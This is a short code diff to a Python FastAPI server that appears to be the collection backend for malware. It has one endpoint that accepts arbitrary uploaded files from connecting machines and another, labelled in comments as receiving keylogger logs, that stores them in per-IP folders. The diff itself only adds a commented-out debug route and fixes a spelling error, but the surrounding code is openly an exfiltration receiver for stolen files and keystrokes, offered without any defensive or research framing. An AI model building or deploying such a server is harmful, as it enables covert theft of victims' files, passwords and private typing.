@@ -5,6 +5,11 @@ from typing import List
 
 app = FastAPI()
 
+# @app.post('/')
+# async def test(request: Request):
+#     print((await request.body()).decode('utf-8'))
+
+
 @app.post("/")
 async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
     IP = request.client.host # get the IP
@@ -17,7 +22,7 @@ async def get_files(request: Request, files: List[UploadFile] = File(...)): # to
             f.write(contents)
 
 @app.post("/log")
-async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # to recieve keylogger logs
+async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # to receive keylogger logs
     IP = request.client.host # get IP
     os.makedirs(IP, exist_ok=True) # make a directory for the IP that sent the file for organization
     os.makedirs(f"{IP}/keylogger-log", exist_ok=True) # make a directory for keylogger logs for organization
